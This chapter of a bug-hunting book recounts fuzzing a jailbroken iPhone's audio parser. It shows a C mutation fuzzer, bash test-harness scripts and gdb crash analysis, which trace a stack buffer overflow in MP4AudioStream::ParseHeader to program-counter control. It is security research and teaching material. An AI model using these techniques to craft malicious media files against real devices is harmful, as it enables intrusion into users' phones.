<html><head></head><body><div class="chapter" title="Chapter&#xA0;8.&#xA0;The Ringtone Massacre"><div class="titlepage"><div><div><h1 class="title"><a id="the_ringtone_massacre"/>Chapter 8. The Ringtone Massacre</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Saturday, March 21, 2009</em></span></p><p><span class="emphasis"><em>Dear Diary</em></span>,</p></div><p>Last week a good friend of mine loaned me his jailbroken,<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-1" class="footnoteref">82</a>]</sup> first-generation iPhone. I was very excited. Ever since Apple announced the iPhone, I had wanted to see if I could find a bug in the device, but until last week I had never had access to one.<a id="IDX-CHP-8-0001" class="indexterm"/><a id="IDX-CHP-8-0002" class="indexterm"/></p><div class="sect1" title="8.1 Vulnerability Discovery"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_discovery-id6"/>8.1 Vulnerability Discovery</h1></div></div></div><p>I finally had an iPhone to play with, and I wanted to search for bugs. But where to start? The first thing I did was make a list of installed applications and libraries that seemed most likely to have bugs. The MobileSafari browser, the MobileMail app, and the audio libraries were at the top of the list. I decided that the audio libraries were the most promising targets since these libraries do a lot of parsing and are heavily used on the phone, so I tried my luck on them.<a id="IDX-CHP-8-0003" class="indexterm"/></p><p>I performed the following steps when searching the iPhone audio libraries for a bug:<a id="IDX-CHP-8-0004" class="indexterm"/><a id="IDX-CHP-8-0005" class="indexterm"/><a id="IDX-CHP-8-0006" class="indexterm"/><a id="IDX-CHP-8-0007" class="indexterm"/><a id="IDX-CHP-8-0008" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>I used a first-generation iPhone with firmware 2.2.1 (5H11) as platform for all the following steps</em></span>.</p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Research the iPhone’s audio capabilities.</p></li><li class="listitem"><p>Step 2: Build a simple fuzzer and fuzz the phone.</p></li></ul></div><div class="note" title="Note"><h3 class="title">Note</h3><p>I installed all the necessary tools—like the Bash, OpenSSH, and the GNU debugger—on the iPhone using Cydia.<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-2" class="footnoteref">83</a>]</sup></p></div><div class="sect2" title="Step 1: Research the iPhone’s Audio Capabilities"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_research_the_iphoneas_audio"/>Step 1: Research the iPhone’s Audio Capabilities</h2></div></div></div><p>The iPhone, with its iPod-based roots, is a powerful audio-capable device. Three frameworks available on the phone provide different levels of sound functionality: the Core Audio,<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-3" class="footnoteref">84</a>]</sup> Celestial, and Audio Toolbox<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-4" class="footnoteref">85</a>]</sup> frameworks. In addition, the iPhone runs an audio daemon called <code class="literal">mediaserverd</code>, which aggregates the sound output of all applications and governs events such as volume and ringer-switch changes.<a id="IDX-CHP-8-0009" class="indexterm"/></p></div><div class="sect2" title="Step 2: Build a Simple Fuzzer and Fuzz the Phone"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_build_a_simple_fuzzer_and_f"/>Step 2: Build a Simple Fuzzer and Fuzz the Phone</h2></div></div></div><p>The iPhone’s audio system with all its different frameworks seemed a bit complicated, so I decided to start by building a simple fuzzer to search for obvious bugs. The fuzzer that I built does the following:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>On a Linux host: Prepares the test cases by mutating a sample target file.</p></li><li class="listitem"><p>On a Linux host: Serves these test cases via a web server.</p></li><li class="listitem"><p>On the iPhone: Opens the test cases in MobileSafari.</p></li><li class="listitem"><p>On the iPhone: Monitors <code class="literal">mediaserverd</code> for faults.</p></li><li class="listitem"><p>On the iPhone: In the event a fault is uncovered, logs the findings.</p></li><li class="listitem"><p>Repeats these steps.</p></li></ol></div><p>I created the following simple, mutation-based file fuzzer to prepare the test cases on a Linux host:</p><div class="example"><a id="the_code_i_wrote_to_prepare_test"/><p class="title">Example 8-1. The code I wrote to prepare test cases on the Linux host (<span class="emphasis"><em>fuzz.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
02    #include &lt;sys/types.h&gt;
03    #include &lt;sys/mman.h&gt;
04    #include &lt;fcntl.h&gt;
05    #include &lt;stdlib.h&gt;
06    #include &lt;unistd.h&gt;
07
08    int
09    main (int argc, char *argv[])
10    {
11        int          fd          = 0;
12        char *       p           = NULL;
13        char *       name        = NULL;
14        unsigned int file_size   = 0;
15        unsigned int file_offset = 0;
16        unsigned int file_value  = 0;
17
18        if (argc &lt; 2) {
19            printf ("[-] Error: not enough arguments\n");
20            return (1);
21        } else {
22            file_size   = atol (argv[1]);
23            file_offset = atol (argv[2]);
24            file_value  = atol (argv[3]);
25            name        = argv[4];
26        }
27
28        // open file
29        fd = open (name, O_RDWR);
30        if (fd &lt; 0) {
31            perror ("open");
32            exit (1);
33        }
34
35        // mmap file
36        p = mmap (0, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
37        if ((int) p == −1) {
38            perror ("mmap");
39            close (fd);
40            exit (1);
41        }
42
43        // mutate file
44        printf ("[+] file offset: 0x%08x (value: 0x%08x)\n",
 file_offset, file_value);
45        fflush (stdout);
46        p[file_offset] = file_value;
47
48        close (fd);
49        munmap (p, file_size);
50
51        return (0);
52    }</pre></div></div><p>The fuzzer from <a class="xref" href="ch08.html#the_code_i_wrote_to_prepare_test" title="Example 8-1. The code I wrote to prepare test cases on the Linux host (fuzz.c)">Example 8-1</a> takes four arguments: the size of the sample target file, the file offset to manipulate, a 1-byte value that gets written to the given file offset, and the name of the target file. After writing the fuzzer, I compiled it:</p><a id="I_programlisting8_d1e8861"/><pre class="programlisting">linux$ <strong class="userinput"><code>gcc -o fuzz fuzz.c</code></strong></pre><p>I then began fuzzing files of the <span class="emphasis"><em>Advanced Audio Coding</em></span><sup>[<a href="ch08s05.html#ftn.CHP-8-FN-5" class="footnoteref">86</a>]</sup> (<span class="emphasis"><em>AAC</em></span>) format, which is the default audio format used on the iPhone. I chose the standard iPhone ringtone, named <span class="emphasis"><em>Alarm.m4r</em></span>, as a sample target file:<a id="IDX-CHP-8-0010" class="indexterm"/><a id="IDX-CHP-8-0011" class="indexterm"/></p><a id="I_programlisting8_d1e8883"/><pre class="programlisting">linux$ <strong class="userinput"><code>cp Alarm.m4r testcase.m4r</code></strong></pre><p>I typed the following line into the terminal to get the size of the test-case file:</p><a id="I_programlisting8_d1e8889"/><pre class="programlisting">linux$ <strong class="userinput"><code>du -b testcase.m4r</code></strong>
415959  testcase.m4r</pre><p>The command-line options below instruct the fuzzer to replace the byte at file offset 4 with <code class="literal">0xff</code> (decimal 255):</p><a id="I_programlisting8_d1e8900"/><pre class="programlisting">linux$ <strong class="userinput"><code>./fuzz 415959 4 255 testcase.m4r</code></strong>
[+] file offset: 0x00000004 (value: 0x000000ff)</pre><p>I then verified the result with the help of <code class="literal">xxd</code>:<a id="IDX-CHP-8-0012" class="indexterm"/></p><a id="I_programlisting8_d1e8913"/><pre class="programlisting">linux$ <strong class="userinput"><code>xxd Alarm.m4r | head −1</code></strong>
0000000: 0000 0020 <span class="underline">66</span>74 7970 4d34 4120 0000 0000  ... ftypM4A ....

linux$ <strong class="userinput"><code>xxd testcase.m4r | head −1</code></strong>
0000000: 0000 0020 <span class="underline">ff</span>74 7970 4d34 4120 0000 0000  ... .typM4A ....</pre><p>The output shows that file offset 4 (file offsets are counted starting with 0) was replaced with the expected value (<code class="literal">0xff</code>). Next, I created a bash script to automate the file mutation:</p><div class="example"><a id="the_bash_script_i_created_to_automate"/><p class="title">Example 8-2. The bash script I created to automate file mutation (<span class="emphasis"><em>go.sh</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #!/bin/bash
02
03    # file size
04    filesize=415959
05
06    # file offset
07    off=0
08
09    # number of files
10    num=4
11
12    # fuzz value
13    val=255
14
15    # name counter
16    cnt=0
17
18    while [ $cnt -lt $num ]
19    do
20          cp ./Alarm.m4r ./file$cnt.m4a
21          ./fuzz $filesize $off $val ./file$cnt.m4a
22          let "off+=1"
23          let "cnt+=1"
24    done</pre></div></div><p>This script, which is just a wrapper for the fuzzer illustrated in <a class="xref" href="ch08.html#the_code_i_wrote_to_prepare_test" title="Example 8-1. The code I wrote to prepare test cases on the Linux host (fuzz.c)">Example 8-1</a>, automatically creates four test cases of the target file <span class="emphasis"><em>Alarm.m4r</em></span> (see line 20). Starting at file offset 0 (see line 7), the first 4 bytes of the target file (see line 10) are each replaced with a <code class="literal">0xff</code> (see line 13). When executed, the script produced the following output:</p><a id="I_programlisting8_d1e8950"/><pre class="programlisting">linux$ <strong class="userinput"><code>./go.sh</code></strong>
[+] file offset: 0x00000000 (value: 0x000000ff)
[+] file offset: 0x00000001 (value: 0x000000ff)
[+] file offset: 0x00000002 (value: 0x000000ff)
[+] file offset: 0x00000003 (value: 0x000000ff)</pre><p>I then verified the created test cases:</p><a id="I_programlisting8_d1e8957"/><pre class="programlisting">linux$ <strong class="userinput"><code>xxd file0.m4a | head −1</code></strong>
0000000: <span class="underline">ff</span>00 0020 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....

linux$ <strong class="userinput"><code>xxd file1.m4a | head −1</code></strong>
0000000: 00<span class="underline">ff</span> 0020 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....

linux$ <strong class="userinput"><code>xxd file2.m4a | head −1</code></strong>
0000000: 0000 <span class="underline">ff</span>20 6674 7970 4d34 4120 0000 0000  ... ftypM4A ....

linux$ <strong class="userinput"><code>xxd file3.m4a | head −1</code></strong>
0000000: 0000 00<span class="underline">ff</span> 6674 7970 4d34 4120 0000 0000  ....ftypM4A ....</pre><p>As the output shows, the fuzzer worked as expected and modified the appropriate byte in each test-case file. One important fact I haven’t mentioned yet is that the script in <a class="xref" href="ch08.html#the_bash_script_i_created_to_automate" title="Example 8-2. The bash script I created to automate file mutation (go.sh)">Example 8-2</a> changes the file extension of the alarm ringtone from <span class="emphasis"><em>.m4r</em></span> to <span class="emphasis"><em>.m4a</em></span> (see line 20). This is necessary because MobileSafari doesn’t support the <span class="emphasis"><em>.m4r</em></span> file extension used by iPhone ringtones.</p><p>I copied the modified and unmodified alarm ringtone files into the web root directory of the Apache webserver that I had installed on the Linux host. I changed the file extension of the alarm ringtone from <span class="emphasis"><em>.m4r</em></span> to <span class="emphasis"><em>.m4a</em></span> and pointed MobileSafari to the URL of the unmodified ringtone.<a id="IDX-CHP-8-0013" class="indexterm"/></p><p>As illustrated in <a class="xref" href="ch08.html#playing_the_unmodified_alarm.m4a_with_mo" title="Figure 8-1. Playing the unmodified Alarm.m4a with MobileSafari">Figure 8-1</a>, the unmodified target file <span class="emphasis"><em>Alarm.m4a</em></span> successfully played on the phone in MobileSafari. I then pointed the browser to the URL of the first modified test-case file, named <span class="emphasis"><em>file0.m4a</em></span>.</p><p><a class="xref" href="ch08.html#playing_the_modified_test-case_file_open" title="Figure 8-2. Playing the modified test-case file (file0.m4a)">Figure 8-2</a> shows that MobileSafari opens the modified file but isn’t able to parse it correctly.</p><div class="figure"><a id="playing_the_unmodified_alarm.m4a_with_mo"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject8_d1e9028"/><img src="httpatomoreillycomsourcenostarchimages939331.png.jpg" alt="Playing the unmodified Alarm.m4a with MobileSafari"/></div></div><p class="title">Figure 8-1. Playing the unmodified <span class="emphasis"><em>Alarm.m4a</em></span> with MobileSafari</p></div><div class="figure"><a id="playing_the_modified_test-case_file_open"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject8_d1e9039"/><img src="httpatomoreillycomsourcenostarchimages939333.png.jpg" alt="Playing the modified test-case file (file0.m4a)"/></div></div><p class="title">Figure 8-2. Playing the modified test-case file (<span class="emphasis"><em>file0.m4a</em></span>)</p></div><p>So what had I achieved so far? I was able to prepare audio-file test cases via mutation, launch MobileSafari, and instruct it to load the test cases. At this point, I wanted to find a way to automatically open the test-case files in MobileSafari one by one while monitoring <code class="literal">mediaserverd</code> for faults. I created this small Bash script to do the job on the phone:</p><div class="example"><a id="code_to_automatically_open_test_cases"/><p class="title">Example 8-3. Code to automatically open test cases while monitoring <code class="literal">mediaserverd</code> for faults (<span class="emphasis"><em>audiofuzzer.sh</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #!/bin/bash
02
03     fuzzhost=192.168.99.103
04
05     echo [+] =================================
06     echo [+] Start fuzzing
07     echo [+]
08     echo -n "[+] Cleanup: "
09     killall MobileSafari
10     killall mediaserverd
11     sleep 5
12     echo
13
14     origpid=`ps -u mobile -o pid,command | grep /usr/sbin/
mediaserverd | cut -c 0-5`
15     echo [+] Original PID of /usr/sbin/mediaserverd: $origpid
16
17     currpid=$origpid
18     let cnt=0
19     let i=0
20
21     while [ $cnt -le 1000 ];
22     do
23             if [ $i -eq 10 ];
24             then
25                     echo -n "[+] Restarting mediaserverd.. "
26                     killall mediaserverd
27                     sleep 4
28                    origpid=`ps -u mobile -o pid,command | grep /usr/sbin/ →
mediaserverd | cut -c 0-5`
29                     currpid=$origpid
30                     sleep 10
31                     echo "done"
32                     echo [+] New mediaserverd PID: $origpid
33                     i=0
34             fi
35             echo
36             echo [+] =================================
37             echo [+] Current file: http://$fuzzhost/file$cnt.m4a
38             openURL http://$fuzzhost/file$cnt.m4a
39             sleep 30
40             currpid=`ps -u mobile -o pid,command | grep /usr/sbin/
mediaserverd | → cut -c 0-5`
41             echo [+] Current PID of /usr/sbin/mediaserverd: $currpid
42             if [ $currpid -ne $origpid ];
43             then
44                     echo [+] POTENTIAL BUG FOUND! File: file$cnt.m4a
45                     openURL http://$fuzzhost/BUG_FOUND_file$cnt.m4a
46                     origpid=$currpid
47                     sleep 5
48             fi
49             ((cnt++))
50             ((i++))
51             killall MobileSafari
52     done
53
54     killall MobileSafari</pre></div></div><p>The Bash script illustrated in <a class="xref" href="ch08.html#code_to_automatically_open_test_cases" title="Example 8-3. Code to automatically open test cases while monitoring mediaserverd for faults (audiofuzzer.sh)">Example 8-3</a> works this way:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Line 3 displays the IP address of the web server that hosts the test cases.</p></li><li class="listitem"><p>Lines 9 and 10 restart <code class="literal">mediaserverd</code> and kill all running MobileSafari instances in order to create a clean environment.</p></li><li class="listitem"><p>Line 14 copies the process ID of the <code class="literal">mediaserverd</code> audio daemon into the variable <code class="literal">origpid</code>.</p></li><li class="listitem"><p>Line 21 contains the main loop that is executed for each test case.</p></li><li class="listitem"><p>Lines 23–34 restart the <code class="literal">mediaserverd</code> after every 10 test cases. Fuzzing the iPhone can be tedious, since some components, including <code class="literal">mediaserverd</code>, are prone to hangs.</p></li><li class="listitem"><p>Line 38 launches the individual test cases hosted on the web server using the <code class="literal">openURL</code> tool.<sup>[<a href="ch08s05.html#ftn.CHP-8-FN-6" class="footnoteref">87</a>]</sup></p></li><li class="listitem"><p>Line 40 copies the current process ID of the <code class="literal">mediaserverd</code> audio daemon into the variable <code class="literal">currpid</code>.<a id="IDX-CHP-8-0014" class="indexterm"/><a id="IDX-CHP-8-0015" class="indexterm"/><a id="IDX-CHP-8-0016" class="indexterm"/></p></li><li class="listitem"><p>Line 42 compares the saved process ID of <code class="literal">mediaserverd</code> (see line 14) and the current process ID of the daemon. The two process IDs differ when <code class="literal">mediaserverd</code> has encountered a fault and restarted while processing one of the test cases. This finding is logged to the phone’s terminal (see line 44). The script will also send a GET request to the web server that includes the text “<code class="literal">BUG_FOUND</code>” as well as the name of the file that crashed <code class="literal">mediaserverd</code> (see line 45).</p></li><li class="listitem"><p>Line 51 kills the current instance of MobileSafari after each test-case run.</p></li></ul></div><p>After I implemented this little script, I created 1,000 mutations of the <span class="emphasis"><em>Alarm.m4r</em></span> ringtone starting at file offset 0, copied them to the web root directory of the web server, and started the <span class="emphasis"><em>audiofuzzer.sh</em></span> script on the iPhone. From time to time the phone crashed due to memory leaks. Every time that happened, I had to reboot the phone, extract the filename of the last processed test case from the access logfile of the web server, adjust line 18 of <a class="xref" href="ch08.html#code_to_automatically_open_test_cases" title="Example 8-3. Code to automatically open test cases while monitoring mediaserverd for faults (audiofuzzer.sh)">Example 8-3</a>, and continue fuzzing. Fuzzing the iPhone can be such a pain . . . but it was worth it! In addition to the memory leaks that froze the phone, I also found a bunch of crashes due to memory corruption.<a id="IDX-CHP-8-0017" class="indexterm"/><a id="IDX-CHP-8-0018" class="indexterm"/></p></div></div></div>
<div class="sect1" title="8.2 Crash Analysis and Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="crash_analysis_and_exploitation"/>8.2 Crash Analysis and Exploitation</h1></div></div></div><p>After the fuzzer had finished processing the test cases, I searched the access logfile of the web server for “<code class="literal">BUG_FOUND</code>” entries.</p><a id="I_programlisting8_d1e9164"/><pre class="programlisting">linux$ <strong class="userinput"><code>grep BUG /var/log/apache2/access.log</code></strong>
192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file40.m4a</code></strong>
 HTTP/1.1" 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X;
 en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1
 Mobile/5H11 Safari/525.20"
192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file41.m4a</code></strong> HTTP/1.1"
 404 276 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
 AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
192.168.99.103 .. "GET /<strong class="userinput"><code>BUG_FOUND_file42.m4a</code></strong> HTTP/1.1"
 404 277 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us)
 AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20"
[..]</pre><p>As shown in the excerpt of the logfile, <code class="literal">mediaserverd</code> encountered a fault while attempting to play the test-case files 40, 41, and 42. To analyze the crashes, I rebooted the phone and attached the GNU debugger (see Section B.4) to <code class="literal">mediaserverd</code>:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The iPhone, like most mobile devices, uses an ARM CPU. This is important because the ARM assembly language is vastly different from Intel assembly</em></span>.<a id="IDX-CHP-8-0019" class="indexterm"/><a id="IDX-CHP-8-0020" class="indexterm"/></p></div><a id="I_programlisting8_d1e9199"/><pre class="programlisting">iphone# <strong class="userinput"><code>uname -a</code></strong>
Darwin localhost 9.4.1 Darwin Kernel Version 9.4.1: Mon Dec
  8 20:59:30 PST 2008; root:xnu-1228.7.37~4/RELEASE_ARM_S5L8900X
 iPhone1,1 arm M68AP Darwin

iphone# <strong class="userinput"><code>id</code></strong>
uid=0(root) gid=0(wheel)

iphone# <strong class="userinput"><code>gdb -q</code></strong></pre><p>After I started gdb, I used the following command to retrieve the current process ID of <code class="literal">mediaserverd</code>:</p><a id="I_programlisting8_d1e9214"/><pre class="programlisting">(gdb) <strong class="userinput"><code>shell ps -u mobile -O pid | grep mediaserverd</code></strong>
   27   ??  Ss     0:01.63 /usr/sbin/mediaserverd</pre><p>I then loaded the <code class="literal">mediaserverd</code> binary into the debugger and attached it to the process:</p><a id="I_programlisting8_d1e9224"/><pre class="programlisting">(gdb) <strong class="userinput"><code>exec-file /usr/sbin/mediaserverd</code></strong>
Reading symbols for shared libraries ......... done

(gdb) <strong class="userinput"><code>attach 27</code></strong>
Attaching to program: `/usr/sbin/mediaserverd', process 27.
Reading symbols for shared libraries ..................................... done
0x3146baa4 in mach_msg_trap ()</pre><p>Before I continued the execution of <code class="literal">mediaserverd</code>, I used the <code class="literal">follow-fork-mode</code> command to instruct the debugger to follow the child process instead of the parent process:</p><a id="I_programlisting8_d1e9241"/><pre class="programlisting">(gdb) <strong class="userinput"><code>set follow-fork-mode child</code></strong>

(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>I opened MobileSafari on the phone and pointed it to the URL of test-case file number 40 (<span class="emphasis"><em>file40.m4a</em></span>). The debugger produced the following result:</p><a id="I_programlisting8_d1e9254"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x01302000
[Switching to process 27 thread 0xa10b]
0x314780ec in memmove ()</pre><p>The crash occurred when <code class="literal">mediaserverd</code> tried to access memory at address <code class="literal">0x01302000</code>.</p><a id="I_programlisting8_d1e9264"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x 0x01302000</code></strong>
0x1302000:      Cannot access memory at address 0x1302000</pre><p>As the debugger output shows, <code class="literal">mediaserverd</code> crashed while trying to reference an unmapped memory location. To further analyze the crash, I printed the current call stack:<a id="IDX-CHP-8-0021" class="indexterm"/></p><a id="I_programlisting8_d1e9277"/><pre class="programlisting">(gdb) <strong class="userinput"><code>backtrace</code></strong>
#0  0x314780ec in memmove ()
#1  0x3493d5e0 in MP4AudioStream::ParseHeader ()
<strong class="userinput"><code>#2  0x00000072 in ?? ()</code></strong>
Cannot access memory at address 0x72</pre><p>This output was intriguing. The address of stack frame #2 had an unusual value (<code class="literal">0x00000072</code>), which seemed to indicate that the stack had become corrupted. I used the following command to print the last instruction that was executed in <code class="literal">MP4AudioStream::ParseHeader()</code> (see stack frame #1):</p><a id="I_programlisting8_d1e9293"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i 0x3493d5e0 - 4</code></strong>
0x3493d5dc &lt;_ZN14MP4AudioStream11ParseHeaderER27AudioFileStream
Continuation+1652&gt;:      bl      0x34997374 &lt;dyld_stub_memcpy&gt;</pre><p>The last instruction executed in <code class="literal">MP4AudioStream::ParseHeader()</code> was a call to <code class="literal">memcpy()</code>, which must have caused the crash. At this time, the bug had exhibited all the characteristics of a stack buffer overflow vulnerability (see Section A.1).<a id="IDX-CHP-8-0022" class="indexterm"/></p><p>I stopped the debugging session and rebooted the device. After the phone started, I attached the debugger to <code class="literal">mediaserverd</code> again, and this time I also defined a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code> in order to evaluate the function arguments supplied to <code class="literal">memcpy()</code>:</p><a id="I_programlisting8_d1e9324"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
Breakpoint 1 at 0x3493d5dc

(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>I opened test case number 40 (<span class="emphasis"><em>file40.m4a</em></span>) in MobileSafari in order to trigger the breakpoint:</p><a id="I_programlisting8_d1e9337"/><pre class="programlisting">[Switching to process 27 thread 0x9c0b]

Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>The arguments of <code class="literal">memcpy()</code> are usually stored in the registers <code class="literal">r0</code> (destination buffer), <code class="literal">r1</code> (source buffer), and <code class="literal">r2</code> (bytes to copy). I asked the debugger for the current values of those registers.</p><a id="I_programlisting8_d1e9353"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers r0 r1 r2</code></strong>
r0             0x684a38 6834744
r1             0x115030 1134640
r2             0x1fd0   8144</pre><p>I also inspected the data pointed to by <code class="literal">r1</code> to see if the source data of <code class="literal">memcpy()</code> was user controllable:</p><a id="I_programlisting8_d1e9366"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/40x $r1</code></strong>
0x115030:       0x00000000      0xd7e178c2      0xe5e178c2      0x80bb0000
0x115040:       0x00b41000      0x00000100      0x00000001      0x00000000
0x115050:       0x00000000      0x00000100      0x00000000      0x00000000
0x115060:       0x00000000      0x00000100      0x00000000      0x00000000
0x115070:       0x00000000      0x00000040      0x00000000      0x00000000
0x115080:       0x00000000      0x00000000      0x00000000      0x00000000
0x115090:       0x02000000      0x2d130000      0x6b617274      0x5c000000
0x1150a0:       0x64686b74      0x07000000      0xd7e178c2      0xe5e178c2
0x1150b0:       0x01000000      0x00000000      0x00b41000      0x00000000
0x1150c0:       0x00000000      0x00000000      0x00000001      0x00000100</pre><p>I then searched test-case file number 40 for those values. I found them right at the beginning of the file in little-endian notation:<a id="IDX-CHP-8-0023" class="indexterm"/></p><a id="I_programlisting8_d1e9376"/><pre class="programlisting">[..]
00000030h: 00 00 00 00 C2 78 E1 D7 C2 78 E1 E5 00 00 BB 80 ; ....Âxá×Âxáå..»₠
00000040h: 00 10 B4 00 00 01 00 00 01 00 00 00 00 00 00 00 ; ..'.............
00000050h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
00000060h: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 ; ................
00000070h: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 ; ....@...........
[..]</pre><p>So I could control the source data of the memory copy. I continued the execution of <code class="literal">mediaserverd</code> and got the following output in the debugger:</p><a id="I_programlisting8_d1e9383"/><pre class="programlisting">(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.

Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x00685000
0x314780ec in memmove ()</pre><p><code class="literal">Mediaserverd</code> crashed again while trying to access unmapped memory. It seemed that the size argument supplied to <code class="literal">memcpy()</code> was too big, so the function tried to copy audio-file data beyond the end of the stack. At this point I stopped the debugger and opened the test-case file that had actually caused the crash (<span class="emphasis"><em>file40.m4a</em></span>) with a hex editor:</p><a id="I_programlisting8_d1e9399"/><pre class="programlisting">00000000h: 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 ; ... ftypM4A ....
00000010h: 4D 34 41 20 6D 70 34 32 69 73 6F 6D 00 00 00 00 ; M4A mp42isom....
00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 00 6C <span class="underline">6D 76 68 64</span> ; ...emoovÿ..lmvhd
[..]</pre><p>The manipulated byte (<code class="literal">0xff</code>) that caused the crash can be found at file offset 40 (<code class="literal">0x28</code>). I consulted the <span class="emphasis"><em>QuickTime File Format Specification</em></span><sup>[<a href="ch08s05.html#ftn.CHP-8-FN-7" class="footnoteref">88</a>]</sup> to determine the role of that byte within the file structure. The byte was described as part of the atom size of a <span class="emphasis"><em>movie header atom</em></span>, so the fuzzer must have changed the size value of that atom. As I mentioned before, the size supplied to <code class="literal">memcpy()</code> was too big, so <code class="literal">mediaserverd</code> had crashed while trying to copy too much data onto the stack. To avoid the crash, I set the atom size to a smaller value. I changed the manipulated value at file offset 40 back to <code class="literal">0x00</code> and the byte value at offset 42 to <code class="literal">0x02</code>. I named the new file <span class="emphasis"><em>file40_2.m4a</em></span>.<a id="IDX-CHP-8-0024" class="indexterm"/><a id="IDX-CHP-8-0025" class="indexterm"/></p><p>Here is the original test-case file 40 (<span class="emphasis"><em>file40.m4a</em></span>):</p><a id="I_programlisting8_d1e9449"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">FF</span> 00 <span class="underline">00</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>And here is the new test-case file (<span class="emphasis"><em>file40_2.m4a</em></span>) with changes underlined:</p><a id="I_programlisting8_d1e9462"/><pre class="programlisting">00000020h: 00 00 1C 65 6D 6F 6F 76 <span class="underline">00</span> 00 <span class="underline">02</span> 6C 6D 76 68 64 ; ...emoovÿ..lmvhd</pre><p>I rebooted the device to get a clean environment, attached the debugger to <code class="literal">mediaserverd</code> again, and opened the new file in MobileSafari.</p><a id="I_programlisting8_d1e9475"/><pre class="programlisting">Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_PROTECTION_FAILURE at address: 0x00000072
[Switching to process 27 thread 0xa10b]
0x00000072 in ?? ()</pre><p>This time the program counter (instruction pointer) was manipulated to point to address <code class="literal">0x00000072</code>. I then stopped the debugging session and started a new one while again setting a breakpoint at the <code class="literal">memcpy()</code> call in <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9488"/><pre class="programlisting">(gdb) <strong class="userinput"><code>break *0x3493d5dc</code></strong>
Breakpoint 1 at 0x3493d5dc

(gdb) <strong class="userinput"><code>continue</code></strong>
Continuing.</pre><p>When I opened the modified test-case file <span class="emphasis"><em>file40_2.m4a</em></span> in MobileSafari, I got the following output in the debugger:</p><a id="I_programlisting8_d1e9502"/><pre class="programlisting">[Switching to process 71 thread 0x9f07]

Breakpoint 1, 0x3493d5dc in MP4AudioStream::ParseHeader ()</pre><p>I printed the current call stack:</p><a id="I_programlisting8_d1e9506"/><pre class="programlisting"><strong class="userinput"><code>(gdb) backtrace</code></strong>
<strong class="userinput"><code>#0  0x3493d5dc in MP4AudioStream::ParseHeader ()</code></strong>
#1  0x3490d748 in AudioFileStreamWrapper::ParseBytes ()
#2  0x3490cfa8 in AudioFileStreamParseBytes ()
#3  0x345dad70 in PushBytesThroughParser ()
#4  0x345dbd3c in FigAudioFileStreamFormatReaderCreateFromStream ()
#5  0x345dff08 in instantiateFormatReader ()
#6  0x345e02c4 in FigFormatReaderCreateForStream ()
#7  0x345d293c in itemfig_assureBasicsReadyForInspectionInternal ()
#8  0x345d945c in itemfig_makeReadyForInspectionThread ()
#9  0x3146178c in _pthread_body ()
#10 0x00000000 in ?? ()</pre><p>The first stack frame on the list was the one I was looking for. I used the following command to display information about the current stack frame of <code class="literal">MP4AudioStream::ParseHeader()</code>:</p><a id="I_programlisting8_d1e9518"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info frame 0</code></strong>
Stack frame at 0x1301c00:
 pc = 0x3493d5dc in MP4AudioStream::ParseHeader(AudioFileStream
Continuation&amp;); saved pc 0x3490d748
 called by frame at 0x1301c30
 Arglist at 0x1301bf8, args:
